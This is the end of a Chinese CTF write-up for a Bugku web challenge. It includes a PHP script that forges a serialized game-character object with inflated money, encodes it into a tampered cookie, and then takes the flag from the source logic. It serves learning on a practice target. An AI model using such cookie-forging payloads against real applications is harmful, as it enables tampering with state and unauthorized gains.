    $payload = 'O:5:"human":10:{s:8:"xueliang";i:850;s:5:"neili";i:879;s:5:"lidao";i:53;s:6:"dingli";i:87;s:7:"waigong";i:0;s:7:"neigong";i:0;s:7:"jingyan";i:0;s:6:"yelian";i:0;s:5:"money";i:100000000;s:4:"flag";s:1:"0";}';
    $result = "";
    for($i = 0; $i < strlen($payload); $i++){
        $num = ord($payload[$i]);
        $num = $num + (($i % 10) + 2);
        $num = $num ^ $i;
        $result = $result.chr($num);
    }
    echo urlencode(base64_encode($result));
?>
```

PHP版本的输出就没有问题：

![](https://hujiekang.top/images/uploads/big/26e1993f3150ffa698dfd53aa797b4f0.png)

那为什么JS就有问题呢？首先PHP的算法是没有错误的，而JS里面调用的是网站上的base64函数，难道是这个函数被做了手脚？
查看`base64.js`，果然发现一个憨憨注释：

![](https://hujiekang.top/images/uploads/big/500cdaabdea643640d7ef7ba2b978c80.png)

原来数据输出的时候并没有进行UTF-8编码，也就是说输出的编码是JS默认的UTF-16，这也就是PHP和JS输出不一样的原因。

解决了这个问题，接下来就可以快乐的刷钱刷能力槽了，把钱刷到一亿之后去买东西，发现买完东西提示购买成功的时候会返回一条`Set-Cookie`请求，把其内容解码后可以得到每个属性刷满后的值：

![](https://hujiekang.top/images/uploads/big/270bb4e3d41ad1103ab673e5eed0afcc.png)

如法炮制把每个东西都买一遍，得到了所有属性的满值：
- 血量：18000
- 内力：18000
- 力道：3000
- 定力：3000
- 外功、内功、经验、冶炼：1
然后修炼如来神掌，发现flag值被修改为827949417。

修改之后再查看属性，发现直接满级：

![](https://hujiekang.top/images/uploads/big/2ca4c9c834a4fd1c692abbc714fd6884.png)

然后去打大魔头，发现Burp抓包后提交的请求，Cookie在浏览器上显示还是原来那个。。。
又看了一遍源码，发现其实不用打大魔头就可以得到flag了，因为源码中是通过判断对象中的flag值来给出flag的，而我们上面已经得到flag了，直接按照源码进行md5加密后，得到flag。

PS：有个彩蛋在`/wulin.php`，可以检测flag的正确性，验证正确后提示”恭喜你“（有点憨憨）

![](https://hujiekang.top/images/uploads/big/5a5b0af48b50be0983073d3dae8ef5ed.png)

## 总结

差不多把Web部分的题目都做完了，其实还有几道题没有做，但是这些题不是502就是无解，那我也莫得办法。。。（yysy Bugku的服务器有点8行）
作为一个菜的不行的新手，这个靶场就全当是见世面了。。。
许多题目都借助了百度，但确实学习到了很多知识和原理，收获也蛮大的
总之就。。。加油叭 再接再厉
以后学了其他部分也会去做对应的题的 到时候再更新&#x1F602;
